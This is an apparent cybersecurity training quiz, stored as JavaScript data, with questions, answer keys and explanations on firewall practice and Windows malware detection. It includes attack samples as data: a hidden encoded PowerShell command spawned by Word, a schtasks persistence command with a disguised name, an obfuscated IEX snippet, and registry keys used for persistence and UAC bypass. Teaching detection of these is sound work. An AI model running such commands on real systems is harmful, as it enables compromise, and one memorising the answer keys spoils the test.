            explanation: '🌍 Geo-Blocking Reality: **Limitations**: 1) **VPN bypass** ($5/month = any country IP), 2) **IP accuracy** (mobile IPs, dynamic allocation, VPN endpoints), 3) **Collateral damage** (block China = block Chinese CDN serving global content), 4) **Business impact** (remote workers, partners). **Effectiveness**: Reduces noise (90% attacks from specific regions), compliance (data residency). **Better approach**: Geo + threat intel + behavior analysis. Allow known IPs, challenge unknowns (MFA), block + log for investigation. Tools: MaxMind, IP2Location. Use as layer, not sole defense.'
        },
        {
            id: 'fw37',
            title: 'Protocol Anomaly Detection',
            points: 7,
            question: 'Firewall detects HTTP traffic on port 8080 but traffic contains binary data (not HTTP). What is this detecting?',
            type: 'radio',
            options: [
                { value: 'protocol_anomaly', text: 'Protocol anomaly' },
                { value: 'encryption', text: 'Encrypted HTTP' },
                { value: 'fragmentation', text: 'Fragmented HTTP packets' },
                { value: 'normal', text: 'Normal behavior' },
                { value: 'dos', text: 'Denial of Service attack' }
            ],
            correct: 'protocol_anomaly',
            explanation: '🔍 Protocol Validation: Port number ≠ guarantee of protocol. Port 8080 labeled "HTTP" but contains non-HTTP = suspicious. Scenarios: 1) **C2 traffic** (malware using uncommon port), 2) **Tunneling** (SSH over 443, VPN over 53), 3) **Evasion** (bypass port-based filters). NGFWs: Deep packet inspection (DPI) examines payload, identifies real protocol. Example: Port 53 but not DNS (DNS tunneling), Port 443 but not TLS (obfuscated traffic). Defense: Protocol enforcement, App-ID, block unexpected protocols on standard ports. Detection: Palo Alto App-ID, Suricata protocol detection.'
        },
        {
            id: 'fw38',
            title: 'Firewall Certificate Inspection',
            points: 8,
            question: 'SSL/TLS inspection on firewall. What is the security trade-off?',
            type: 'checkbox',
            options: [
                { value: 'visibility', text: 'Gain visibility into encrypted traffic' },
                { value: 'privacy', text: 'Loss of end-to-end privacy' },
                { value: 'mitm', text: 'Creates man-in-the-middle architecture' },
                { value: 'performance', text: 'Performance impact' },
                { value: 'no_trade', text: 'No trade-offs' },
                { value: 'breaks_pinning', text: 'Breaks certificate pinning in apps' }
            ],
            correct: ['visibility', 'privacy', 'mitm', 'performance', 'breaks_pinning'],
            explanation: '🔐 SSL Inspection Controversy: **Benefits**: Detect malware in HTTPS (80% web traffic encrypted), DLP (prevent data theft), policy enforcement. **Costs**: 1) **Privacy** (firewall sees passwords, medical data), 2) **MITM** (firewall signs certs with corporate CA - if compromised = game over), 3) **Performance** (CPU-intensive), 4) **Breaks apps** (cert pinning, mutual TLS), 5) **Compliance** (HIPAA, PCI-DSS concerns). **Best practice**: Selective decryption (exclude healthcare, banking sites), strong CA key protection, legal/HR sign-off, alternative (EDR, DNS filtering). TLS 1.3 makes harder (encrypted SNI).'
        },
        {
            id: 'fw39',
            title: 'Port Knocking Detection',
            points: 6,
            question: 'Firewall logs show: Connection attempts to ports 7000, 8000, 9000 from same IP in sequence, then SSH connection. What technique?',
            type: 'radio',
            options: [
                { value: 'port_knock', text: 'Port knocking' },
                { value: 'port_scan', text: 'Port scanning attack' },
                { value: 'brute_force', text: 'Brute force attack' },
                { value: 'dos', text: 'Denial of service' },
                { value: 'normal', text: 'Normal application behavior' }
            ],
            correct: 'port_knock',
            explanation: '🚪 Port Knocking Detection: Legitimate technique (hide SSH from scanners) but also used by: 1) **Backdoors** (malware uses knock to activate), 2) **Legitimate admins** (security through obscurity). Indicators: Sequential ports, precise timing, followed by connection to "closed" port. As defender: 1) **Alert on pattern** (SOC investigation), 2) **Verify legitimacy** (authorized admin or compromise?), 3) **Alternative**: VPN + MFA better than port knocking. Detection: SIEM correlation (sequence within time window). If unauthorized = IOC (Indicator of Compromise).'
        },
        {
            id: 'fw40',
            title: 'Rule Expiration Policy',
            points: 5,
            question: 'Why implement automatic rule expiration dates?',
            type: 'checkbox',
            options: [
                { value: 'temp_access', text: 'Enforce temporary access' },
                { value: 'review', text: 'Force periodic review of rule necessity' },
                { value: 'reduce_sprawl', text: 'Reduce rule sprawl' },
                { value: 'compliance', text: 'Meet compliance requirements' },
                { value: 'performance', text: 'Rules automatically become faster when expired' },
                { value: 'required', text: 'Required by all firewalls' }
            ],
            correct: ['temp_access', 'review', 'reduce_sprawl', 'compliance'],
            explanation: '⏰ Rule Lifecycle Management: Temporary rules become permanent without expiration. **Use cases**: 1) **Contractor access** (expire with contract end), 2) **Project firewall** (expire when project completes), 3) **Emergency rules** (expire after incident), 4) **Force review** (expire annually, renew if still needed). Implementation: Metadata field "expiration_date", automation disables/alerts. Cisco: time-based ACL, Palo Alto: schedule objects. Benefits: Automatic least privilege, audit trail (renewal = documented business need), prevent forgotten rules. NOT universal feature (add via change management process).'
        },
        {
            id: 'fw41',
            title: 'Deny-Log vs Deny-Silent',
            points: 5,
            question: 'When should firewall use "Deny without logging" instead of "Deny with logging"?',
            type: 'radio',
            options: [
                { value: 'noise', text: 'High-volume expected denies to reduce log noise' },
                { value: 'never', text: 'Never' },
                { value: 'performance', text: 'Always use deny-silent' },
                { value: 'hide', text: 'Hide security events from auditors' },
                { value: 'storage', text: 'When storage is unlimited' }
            ],
            correct: 'noise',
            explanation: '🔇 Selective Logging: Internet-facing FW = millions of port scans daily (noise). **Log**: Internal→External denies (data exfiltration attempts), unusual protocols, spoofed packets, policy violations. **Don\'t log**: Internet→Internal port scans on RFC1918 (non-routable), NetBIOS broadcasts, routine denies. Implementation: **Explicit deny rules** at top (log these), **implicit deny** at bottom (silent). Example: Rule 1: DENY Internal→External non-business ports (LOG), Rule 999: DENY ANY ANY (no log). Balance: Security visibility vs log storage vs SIEM cost. Aggregate: Count denies, alert on threshold (sudden spike = incident).'
        },
        {
            id: 'fw42',
            title: 'Firewall Bypass via IPv6 Tunnel',
            points: 8,
            question: 'Network has IPv4 firewall only. User runs Teredo/6to4. What security risk?',
            type: 'radio',
            options: [
                { value: 'ipv6_bypass', text: 'IPv6 tunneled over IPv4 bypasses firewall rules entirely' },
                { value: 'no_risk', text: 'No risk' },
                { value: 'performance', text: 'Performance degradation only' },
                { value: 'encryption', text: 'Encryption incompatibility' },
                { value: 'protocol', text: 'Protocol confusion' }
            ],
            correct: 'ipv6_bypass',
            explanation: '🌐 IPv6 Tunneling Bypass: Teredo, 6to4, ISATAP = IPv6 over IPv4 tunnels (protocol 41 or UDP 3544). **Risk**: IPv4 FW sees UDP, allows tunnel, IPv6 traffic inside = unfiltered. Attacker: Tunnel C2 over IPv6, bypass all firewall rules. **Also**: Default IPv6 (enabled on Windows/Mac), connects to IPv6 internet via tunnels. **Defense**: 1) **Block tunnels** (protocol 41, UDP 3544), 2) **Disable IPv6** (netsh interface ipv6 set teredo disabled), 3) **IPv6 firewall** if IPv6 used. Check: netsh interface ipv6 show teredo. Common misconfiguration = invisible IPv6 connectivity.'
        },
        {
            id: 'fw43',
            title: 'Stateful Session Hijacking',
            points: 7,
            question: 'Attacker spoofs TCP packets with correct sequence numbers after connection established. Can stateful firewall prevent this?',
            type: 'radio',
            options: [
                { value: 'limited', text: 'Limited' },
                { value: 'yes', text: 'Yes' },
                { value: 'no', text: 'No' },
                { value: 'encryption', text: 'Only if encryption enabled on firewall' },
                { value: 'depends', text: 'Depends on firewall brand only' }
            ],
            correct: 'limited',
            explanation: '🔓 Stateful Limitations: Basic stateful FW tracks: src_ip, dst_ip, src_port, dst_port, state (SYN, ESTABLISHED). Does NOT validate: TCP sequence numbers, application data. **Attack**: If attacker can sniff packets (same network), sees seq numbers, injects with correct seq → firewall allows (matches state). **Defense**: 1) **End-to-end encryption** (TLS, SSH - prevents injection), 2) **Advanced FW features** (TCP sequence validation, rare), 3) **Network segmentation** (limit sniffing ability). Stateful ≠ deep inspection. Modern: NGFWs add application awareness but still vulnerable to on-path attacks. MitM difficult, not impossible.'
        },
        {
            id: 'fw44',
            title: 'Firewall Load Distribution',
            points: 6,
            question: 'Multiple firewalls handle traffic. Which method ensures both directions of connection go through SAME firewall?',
            type: 'radio',
            options: [
                { value: 'source_hash', text: 'Source IP hash determines firewall)' },
                { value: 'round_robin', text: 'Round-robin distribution' },
                { value: 'random', text: 'Random selection' },
                { value: 'least_connections', text: 'Least connections algorithm' },
                { value: 'any', text: 'Any method works (doesn\'t matter)' }
            ],
            correct: 'source_hash',
            explanation: '🔀 Session Persistence: Stateful firewall needs both directions. Hash(source_IP) = consistent firewall choice (1.2.3.4 always FW1, 5.6.7.8 always FW2). **vs Round-robin**: Packet 1 via FW1, packet 2 via FW2 = asymmetric routing = DROP. **vs Random**: Same problem. **vs Least connections**: Connections shift = asymmetry. Alternative: **5-tuple hash** (src_ip+dst_ip+src_port+dst_port+protocol) = even more specific. Cluster: Shared state table (expensive) = any FW works but complex. Load balancer: Configures persistence method. ECMP routing: Hash-based by default.'
        },
        {
            id: 'fw45',
            title: 'Broadcast Traffic Firewall',
            points: 5,
            question: 'Can firewall rules filter broadcast traffic (255.255.255.255)?',
            type: 'radio',
            options: [
                { value: 'no_route', text: 'No' },
                { value: 'yes', text: 'Yes' },
                { value: 'depends', text: 'Depends on firewall brand' },
                { value: 'license', text: 'Requires special license' },
                { value: 'only_ipv6', text: 'Only IPv6 broadcasts can be filtered' }
            ],
            correct: 'no_route',
            explanation: '📡 Broadcast Scope: Broadcasts (255.255.255.255, Layer 2 FF:FF:FF:FF:FF:FF) limited to local subnet. Routers/firewalls don\'t forward broadcasts (except directed broadcast if enabled). **Firewall doesn\'t see**: DHCP Discover, ARP, NetBIOS name resolution (broadcast domain). **Firewall sees**: Directed broadcast to specific subnet (192.168.1.255) if routing enabled. **Control broadcasts**: Switch-level (port security, DHCP snooping, ARP inspection), VLAN segmentation. Exception: VPN/tunnels (encapsulate broadcasts). IPv6: No broadcast (uses multicast instead - ff02::1 all nodes).'
        },
        {
            id: 'fw46',
            title: 'Firewall Change Management',
            points: 7,
            question: 'What should be included in firewall change request? (Select ALL critical items)',
            type: 'checkbox',
            options: [
                { value: 'business_justification', text: 'Business justification' },
                { value: 'risk_assessment', text: 'Risk assessment' },
                { value: 'rollback', text: 'Rollback plan' },
                { value: 'testing', text: 'Testing plan' },
                { value: 'speed', text: 'Implement as fast as possible' },
                { value: 'permanent', text: 'All changes should be permanent' }
            ],
            correct: ['business_justification', 'risk_assessment', 'rollback', 'testing'],
            explanation: '📋 Change Management Process: Firewall = critical infrastructure. **Requirements**: 1) **Business case** (who requested, why, what breaks without it), 2) **Risk** (ports/protocols exposed, data sensitivity), 3) **Least privilege** (narrow as possible), 4) **Test plan** (dev firewall first, verify), 5) **Rollback** (exact steps to revert), 6) **Approval** (manager, security team), 7) **Documentation** (rule description, ticket #), 8) **Schedule** (change window, notification). **Emergency bypass**: Documented post-implementation. Typical: 80% rules never removed = change discipline critical. Tools: Ticket system, FW management platform (Tufin), peer review.'
        },
        {
            id: 'fw47',
            title: 'TCP Reset Injection',
            points: 6,
            question: 'Firewall can respond to denied connections with TCP RST or drop silently. Which is better for security?',
            type: 'radio',
            options: [
                { value: 'depends', text: 'Depends' },
                { value: 'always_rst', text: 'Always RST' },
                { value: 'always_drop', text: 'Always silent drop' },
                { value: 'no_difference', text: 'No security difference' },
                { value: 'rst_insecure', text: 'RST is always insecure' }
            ],
            correct: 'depends',
            explanation: '🚫 Reject vs Drop: **TCP RST** = Immediate rejection, client knows port closed, faster timeout. **Silent DROP** = Client waits for timeout (slow), attacker learns less (port filtered or host down?). **Internal**: RST (user experience, faster troubleshooting). **External**: DROP (stealth, slower port scans, less information disclosure). **Port scan impact**: RST = clear map of filtered ports, DROP = ambiguous (timeout could be host down, congestion, filtering). Modern: Most FWs default DROP external, RST internal. Not always clear-cut (balance usability vs security). Advanced: Rate-limit RSTs (prevent abuse).'
        },
        {
            id: 'fw48',
            title: 'Out-of-Order Packet Handling',
            points: 6,
            question: 'Firewall receives packet #5 before packet #3 in TCP stream. What should it do?',
            type: 'radio',
            options: [
                { value: 'buffer', text: 'Buffer out-of-order packets' },
                { value: 'drop', text: 'Drop immediately' },
                { value: 'forward', text: 'Forward immediately' },
                { value: 'reject', text: 'Send TCP RST' },
                { value: 'impossible', text: 'Impossible' }
            ],
            correct: 'buffer',
            explanation: '🔀 Out-of-Order Handling: Legitimate on internet (different routes, congestion). Stateful FW: **Buffer** packets temporarily, reassemble, inspect complete stream. Timeout: If missing packet doesn\'t arrive (5 seconds), forward fragments or drop. **Security**: Evasion technique = split attack payload across out-of-order fragments (IDS sees fragments in wrong order = misses attack). **Defense**: Stateful reassembly, stream normalization, drop after timeout. **vs IPS**: Must reassemble BEFORE inspection (can\'t let attack fragments reach destination). Cost: Memory (buffer), complexity. Settings: Buffer size, timeout tuning.'
        },
        {
            id: 'fw49',
            title: 'P2P Application Blocking',
            points: 7,
            question: 'Organization blocks BitTorrent on port 6881. Users still use BitTorrent. Why?',
            type: 'checkbox',
            options: [
                { value: 'random_ports', text: 'BitTorrent uses random ports' },
                { value: 'encryption', text: 'Protocol encryption' },
                { value: 'port_80', text: 'Can tunnel over port 80/443' },
                { value: 'dpi_needed', text: 'Requires DPI/App-ID' },
                { value: 'unblockable', text: 'BitTorrent is completely unblockable' },
                { value: 'vpn', text: 'Users use VPN' }
            ],
            correct: ['random_ports', 'encryption', 'port_80', 'dpi_needed', 'vpn'],
            explanation: '🚫 P2P Challenges: Port blocking = whack-a-mole. **BitTorrent**: Random ports, encrypted headers, DHT (distributed), uTP protocol, can use 80/443. **Effective blocking**: 1) **NGFW App-ID** (identify BT regardless of port/encryption), 2) **DPI** (pattern matching), 3) **Block DHT bootstrap** (IPs of tracker nodes), 4) **Throttle** (not block - reduces user workarounds), 5) **Acceptable Use Policy** + monitoring. **Arms race**: BT adds obfuscation, FW vendors update signatures. **Reality**: Determined users find VPNs. Better: Policy + education + monitoring vs arms race.'
        },
        {
            id: 'fw50',
            title: 'Firewall Rule Testing',
            points: 6,
            question: 'Before deploying firewall rule to production, what is BEST testing approach?',
            type: 'radio',
            options: [
                { value: 'dev_mirror', text: 'Test on dev/staging firewall with mirrored rules, then production' },
                { value: 'prod_direct', text: 'Deploy directly to production' },
                { value: 'log_only', text: 'Add rule in log-only mode first' },
                { value: 'night', text: 'Deploy during night' },
                { value: 'no_test', text: 'Testing not necessary for firewall rules' }
            ],
            correct: 'dev_mirror',
            explanation: '🧪 Firewall Testing: Mistakes = outage (block business traffic). **Best practice**: 1) **Dev/staging firewall** (identical config, test new rule), 2) **Test plan** (verify allowed traffic works, denied traffic blocks), 3) **Rollback** (know exact commands to remove), 4) **Change window** (business hours with support available), 5) **Monitor** (watch for alerts, user complaints). **Log-only mode**: Some FWs support (Palo Alto), good for tuning but not all vendors. **Night deployment**: Sounds safe but if breaks = no support, business down next morning. Proper test environment = critical investment. Automate: Ansible/Terraform for firewall changes = version control + testing.'
        }
    ],
    malware: [
        {
            id: 'mal1',
            title: 'Persistence Mechanism Identification',
            points: 12,
            question: 'Which registry key is commonly abused for malware persistence on Windows startup?',
            type: 'radio',
            options: [
                { value: 'run', text: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' },
                { value: 'uninstall', text: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall' },
                { value: 'services', text: 'HKLM\\System\\CurrentControlSet\\Services' },
                { value: 'policies', text: 'HKLM\\Software\\Policies\\Microsoft\\Windows' },
                { value: 'winlogon', text: 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' },
                { value: 'classes', text: 'HKLM\\Software\\Classes\\exefile\\shell\\open\\command' }
            ],
            correct: 'run',
            explanation: '💾 HKLM\\...\\Run is the MOST common persistence location (MITRE T1547.001). Executes on every boot. Variants: Run, RunOnce, RunServices. Check both HKLM (all users) and HKCU (current user). Red herrings: Winlogon CAN be abused (Userinit, Shell keys) but less common. Services require elevated privileges. Classes\\exefile = hijacking but very obvious. Monitor with: Autoruns, reg query, Sysmon EventID 13.'
        },
        {
            id: 'mal2',
            title: 'Malicious Indicator Recognition',
            points: 13,
            question: 'An EDR alert shows:<br><code>Process: WINWORD.EXE (PID 4521)<br>Child Process: powershell.exe -WindowStyle Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMA<br>Network: Outbound connection to 45.142.212.61:443<br>File Modified: C:\\Users\\jsmith\\AppData\\passwords.txt</code><br><br>Select ALL malicious indicators:',
            type: 'checkbox',
            options: [
                { value: 'word_ps', text: 'Word spawning PowerShell' },
                { value: 'hidden', text: 'Hidden window and encoded command' },
                { value: 'external_ip', text: 'Connection to external IP on HTTPS port' },
                { value: 'sensitive_file', text: 'Modification of file named "passwords.txt"' },
                { value: 'appdata', text: 'Activity in AppData folder' }
            ],
            correct: ['word_ps', 'hidden', 'external_ip', 'sensitive_file'],
            explanation: '🚨 Classic macro malware (Emotet/Qakbot pattern): 1) WINWORD→PowerShell = abnormal process tree (legit: Word→OUTLOOK or no children). 2) -WindowStyle Hidden + -enc = obfuscation to hide from user. 3) External IP:443 = HTTPS C2 beaconing to attacker infrastructure. 4) passwords.txt modified = credential harvesting/exfiltration. ✅ AppData activity ALONE is benign (Chrome, Spotify, etc. use AppData). Only suspicious when combined with other IoCs. Investigate: Decode base64, check IP reputation (VirusTotal), isolate host immediately.'
        },
        {
            id: 'mal3',
            title: 'Scheduled Task Persistence',
            points: 9,
            question: 'Attacker creates scheduled task:<br><code>schtasks /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\svchost.exe" /sc onlogon /ru SYSTEM</code><br>What makes this suspicious?',
            type: 'checkbox',
            options: [
                { value: 'location', text: 'svchost.exe in ProgramData' },
                { value: 'name', text: 'Task name mimics legitimate Windows service' },
                { value: 'system', text: 'Running as SYSTEM' },
                { value: 'trigger', text: 'onlogon trigger' },
                { value: 'schtasks', text: 'Using schtasks command' }
            ],
            correct: ['location', 'name', 'system', 'trigger'],
            explanation: '⏱️ Scheduled Task Abuse (MITRE T1053.005): Real svchost.exe = C:\\Windows\\System32\\svchost.exe. ProgramData/Temp/AppData = common malware hiding spots. Name mimics legit service (WindowsUpdate vs "Windows Update"). SYSTEM privileges = kernel-level access. onlogon = persistence on every login. Defense: Monitor Sysmon EventID 1 (process creation) + Security 4698 (scheduled task created). Tools: Autoruns, "schtasks /query /fo LIST /v". Note: schtasks itself is legitimate Windows tool (not inherently malicious).'
        },
        {
            id: 'mal4',
            title: 'DLL Hijacking Detection',
            points: 10,
            question: 'Legitimate application C:\\Program Files\\App\\program.exe loads malicious.dll from C:\\Program Files\\App\\ instead of System32. What attack is this?',
            type: 'radio',
            options: [
                { value: 'dll_hijack', text: 'DLL Search Order Hijacking' },
                { value: 'injection', text: 'DLL Injection via CreateRemoteThread' },
                { value: 'hollowing', text: 'Process Hollowing' },
                { value: 'side_load', text: 'DLL Side-Loading' },
                { value: 'reflection', text: 'Reflective DLL Injection' }
            ],
            correct: 'dll_hijack',
            explanation: '📚 DLL Search Order Hijacking (MITRE T1574.001): Windows searches for DLLs in order: 1) Application directory, 2) System32, 3) System, 4) Windows, 5) PATH. Attacker places malicious.dll in app folder → loaded before legitimate System32 version. Similar: DLL Side-Loading targets specifically signed binaries (e.g., AcroRd32.exe loads malicious sqlite3.dll). Defense: Use SafeDllSearchMode, fully qualify DLL paths in code, code signing verification. Tools: Process Monitor (filter LoadImage), Process Explorer. Real-world: Lazarus Group, APT10.'
        },
        {
            id: 'mal5',
            title: 'Fileless Malware Indicators',
            points: 11,
            question: 'Which techniques indicate fileless/living-off-the-land malware? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'wmi', text: 'WMI event subscription executing PowerShell script' },
                { value: 'registry', text: 'Malicious payload stored in registry' },
                { value: 'lolbas', text: 'Using certutil.exe to download and decode malware' },
                { value: 'memory', text: 'Reflective PE injection' },
                { value: 'exe', text: 'Executable dropped to C:\\Windows\\Temp\\malware.exe' },
                { value: 'macro', text: 'Word macro writing VBScript to Startup folder' }
            ],
            correct: ['wmi', 'registry', 'lolbas', 'memory'],
            explanation: '👻 Fileless Malware: Evades disk-based AV by residing in memory/registry. Techniques: 1) WMI persistence (attackers love WMI for remote execution), 2) Registry storage (HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command), 3) LOLBins (certutil -decode, mshta, regsvr32, rundll32), 4) In-memory execution (Metasploit, Cobalt Strike). NOT fileless: Dropping .exe to disk, writing files to Startup. Defense: EDR with memory scanning, restrict PowerShell, monitor LOLBAS usage (Sysmon config), application whitelisting. Campaigns: APT32, FIN7.'
        },
        {
            id: 'mal6',
            title: 'Ransomware Behavior',
            points: 10,
            question: 'EDR detects process encrypting files with extensions .pdf.locked, .docx.locked. What IMMEDIATE action?',
            type: 'radio',
            options: [
                { value: 'isolate', text: 'Isolate host from network immediately' },
                { value: 'scan', text: 'Run full antivirus scan' },
                { value: 'reboot', text: 'Reboot the system' },
                { value: 'backup', text: 'Start backing up encrypted files' },
                { value: 'wait', text: 'Monitor for 10 minutes to gather more indicators' },
                { value: 'decrypt', text: 'Attempt to decrypt files immediately' }
            ],
            correct: 'isolate',
            explanation: '🚨 Ransomware Response: Speed = critical. Active encryption = race against time. 1) ISOLATE network immediately (unplug ethernet/disable WiFi) - prevent spread to file shares/backups. 2) Kill malicious process (if identified). 3) Memory dump for forensics. 4) Identify ransomware variant (ID Ransomware tool). 5) Check backups (offline/immutable only). DON\'T: Reboot (may trigger boot-sector encryption), scan (wastes time), decrypt without key. Modern ransomware spreads in minutes (WannaCry, Ryuk). Playbooks: NIST SP 800-61, CISA Ransomware Guide.'
        },
        {
            id: 'mal7',
            title: 'Dropper vs Loader',
            points: 7,
            question: 'Malware analysis reveals stage-1 downloads stage-2 from attacker server then exits. Stage-2 decrypts stage-3 from its resources. Classify each:',
            type: 'radio',
            options: [
                { value: 'correct', text: 'Stage-1: Dropper, Stage-2: Loader, Stage-3: Payload' },
                { value: 'both_dropper', text: 'Both stage-1 and stage-2 are droppers' },
                { value: 'both_loader', text: 'Both stage-1 and stage-2 are loaders' },
                { value: 'reverse', text: 'Stage-1: Loader, Stage-2: Dropper, Stage-3: Payload' },
                { value: 'downloader', text: 'Stage-1: Downloader, Stage-2: Unpacker, Stage-3: Payload' }
            ],
            correct: 'downloader',
            explanation: '📦 Malware Terminology: **Downloader** = fetches payload from web/C2 (network activity). **Dropper** = contains payload embedded, writes to disk. **Loader** = loads payload into memory (may not write disk). **Unpacker** = decrypts/decompresses embedded payload. Stage-1 downloads (downloader), stage-2 decrypts embedded resources (unpacker/loader). Multi-stage = evasion (stages individually benign, only final payload malicious). Tools: PEiD (packer detection), Process Hacker (memory strings), Wireshark (network). Examples: Emotet (downloader), TrickBot (loader).'
        },
        {
            id: 'mal8',
            title: 'Rootkit Detection',
            points: 11,
            question: 'Task Manager shows 45 processes. API-based tool shows 46 processes (extra hidden process). What is this indicator of?',
            type: 'radio',
            options: [
                { value: 'rootkit', text: 'Rootkit using DKOM or hooking to hide process from userland tools' },
                { value: 'bug', text: 'Task Manager bug or refresh issue' },
                { value: 'system', text: 'Normal system process' },
                { value: 'service', text: 'Windows service running in Session 0' },
                { value: 'protected', text: 'Protected Process Light process' }
            ],
            correct: 'rootkit',
            explanation: '🕵️ Rootkit Detection: Rootkits hook APIs (NtQuerySystemInformation) to hide from userland tools (Task Manager, Process Explorer). Low-level tools bypass hooks. Detection techniques: 1) Cross-view diff (compare Task Manager vs kernel enum), 2) Memory analysis (Volatility pslist vs psscan), 3) GMER, 4) Rootkit Revealer. DKOM = Direct Kernel Object Manipulation (unlink from EPROCESS list). Modern: UEFI/bootkit rootkits (persist through OS reinstall). Examples: TDL4, Necurs, FU Rootkit. Mitigation: Secure Boot, kernel-mode code signing, ELAM drivers.'
        },
        {
            id: 'mal9',
            title: 'Beacon Analysis',
            points: 9,
            question: 'Network monitoring shows workstation connecting to 198.51.100.45:8080 every 60 seconds (exactly). Connections last <1 second. What is this?',
            type: 'radio',
            options: [
                { value: 'c2', text: 'Command and Control beaconing with fixed interval' },
                { value: 'update', text: 'Legitimate software update check' },
                { value: 'ntp', text: 'NTP time synchronization' },
                { value: 'monitoring', text: 'Infrastructure monitoring agent' },
                { value: 'cdn', text: 'CDN health check' }
            ],
            correct: 'c2',
            explanation: '📡 C2 Beaconing: Implants check in with attacker server at regular intervals (jitter = randomness to evade detection). Fixed 60s = low sophistication (Metasploit default). Indicators: 1) Regular interval, 2) Small data size (check-in packet), 3) Unusual port, 4) External IP. Detection: Beacon analysis tools (RITA, ACHunter), netflow analysis (look for periodicity). Advanced C2: Jittered beacons (50-70s random), domain fronting (hide behind CDN), DNS tunneling. Frameworks: Cobalt Strike, Empire, Covenant. Defense: Egress filtering, DNS sinkholing, threat intel feeds.'
        },
        {
            id: 'mal10',
            title: 'UAC Bypass Techniques',
            points: 8,
            question: 'Malware uses fodhelper.exe to execute elevated command without UAC prompt. What technique is this?',
            type: 'radio',
            options: [
                { value: 'uac_bypass', text: 'UAC Bypass via trusted auto-elevated binary' },
                { value: 'privilege_escalation', text: 'Kernel exploit for SYSTEM privileges' },
                { value: 'token_theft', text: 'Token impersonation' },
                { value: 'runas', text: 'RunAs with stored credentials' },
                { value: 'pass_hash', text: 'Pass-the-hash attack' }
            ],
            correct: 'uac_bypass',
            explanation: '⬆️ UAC Bypass (MITRE T1548.002): fodhelper.exe = trusted Windows binary with autoElevate=true in manifest. Malware hijacks HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command registry key → fodhelper reads it → executes attacker command elevated WITHOUT UAC prompt. Other auto-elevated binaries: eventvwr.exe, sdclt.exe, ComputerDefaults.exe. Not privilege escalation (still runs as admin, just bypasses UAC dialog). Defense: Set UAC to "Always notify", monitor registry changes (Sysmon EventID 13), application whitelisting. Tools: UACME (research), Sysinternals Sigcheck.'
        },
        {
            id: 'mal11',
            title: 'Credential Dumping Tools',
            points: 10,
            question: 'Security logs show lsass.exe process memory accessed by unknown process. What attack is likely occurring?',
            type: 'radio',
            options: [
                { value: 'mimikatz', text: 'Credential dumping' },
                { value: 'buffer', text: 'Buffer overflow attempt on LSASS' },
                { value: 'dos', text: 'Denial of Service targeting LSASS' },
                { value: 'normal', text: 'Normal Windows authentication process' },
                { value: 'backup', text: 'System backup process' }
            ],
            correct: 'mimikatz',
            explanation: '🔑 Credential Dumping (MITRE T1003.001): LSASS (Local Security Authority Subsystem Service) stores credentials in memory. Mimikatz, ProcDump, Sysinternals ProcDump access LSASS memory → extract plaintext passwords, NTLM hashes, Kerberos tickets. Detection: Sysmon EventID 10 (ProcessAccess) SourceImage→TargetImage=lsass.exe, Security EventID 4656 (handle to LSASS). Defense: Credential Guard (virtualization-based security), WDigest disabled (KB2871997), Protected Process Light (PPL) for LSASS, LSA Protection (RunAsPPL registry key). Tools: Windows Defender ATP alerts on LSASS access.'
        },
        {
            id: 'mal12',
            title: 'Packer Detection',
            points: 8,
            question: 'Static analysis shows suspicious indicators. Which suggest a packed/obfuscated executable? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'entropy', text: 'High entropy sections' },
                { value: 'imports', text: 'Very few imported functions' },
                { value: 'sections', text: 'Unusual section names' },
                { value: 'strings', text: 'No readable strings in file' },
                { value: 'large', text: 'File size over 10MB' },
                { value: 'signed', text: 'Digitally signed by Microsoft' }
            ],
            correct: ['entropy', 'imports', 'sections', 'strings'],
            explanation: '📦 Packer Detection: Packers compress/encrypt payload to evade signature detection. Indicators: 1) High entropy (7.0+ = encrypted/compressed), 2) Minimal imports (unpacking code needs VirtualAlloc/VirtualProtect/CreateThread), 3) Named sections (UPX, ASPack, Themida, Armadillo), 4) No strings (encrypted). Large file size NOT indicator (can be small). Signed by Microsoft = legitimate (packers don\'t have MS cert). Tools: PEiD, Detect It Easy (DIE), Entropy analysis (pescanner). Unpacking: OllyDbg, x64dbg (set breakpoint on OEP), or automated (unipacker).'
        },
        {
            id: 'mal13',
            title: 'Lateral Movement Techniques',
            points: 9,
            question: 'Attacker compromised Workstation-A. Which methods enable lateral movement to Server-B? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'psexec', text: 'PsExec' },
                { value: 'wmi', text: 'WMI remote execution' },
                { value: 'rdp', text: 'Remote Desktop Protocol with stolen credentials' },
                { value: 'pass_hash', text: 'Pass-the-Hash attack using NTLM hash' },
                { value: 'phishing', text: 'Phishing email to Server-B admin' },
                { value: 'sql', text: 'SQL injection on external website' }
            ],
            correct: ['psexec', 'wmi', 'rdp', 'pass_hash'],
            explanation: '🔀 Lateral Movement (MITRE TA0008): Move from compromised host to other internal systems. Techniques: 1) **PsExec** (MITRE T1021.002): SMB-based remote execution, 2) **WMI** (T1047): Win32_Process Create method, 3) **RDP** (T1021.001): GUI access with creds, 4) **Pass-the-Hash** (T1550.002): Use NTLM hash without cracking password. NOT lateral: Phishing (initial access), SQL injection (web attack). Tools: Mimikatz, Impacket, CrackMapExec. Defense: Network segmentation, disable NTLM, restrict WMI, lateral movement detection (unusual authentication patterns).'
        },
        {
            id: 'mal14',
            title: 'Obfuscation Techniques',
            points: 7,
            question: 'PowerShell script contains: <code>$x=[char]0x70+[char]0x6f+[char]0x77+[char]0x65+[char]0x72; IEX $x</code>. What is the deobfuscated command?',
            type: 'radio',
            options: [
                { value: 'power', text: 'IEX power' },
                { value: 'exploit', text: 'IEX exploit' },
                { value: 'download', text: 'IEX download' },
                { value: 'invoke', text: 'IEX invoke' },
                { value: 'shell', text: 'IEX shell' }
            ],
            correct: 'power',
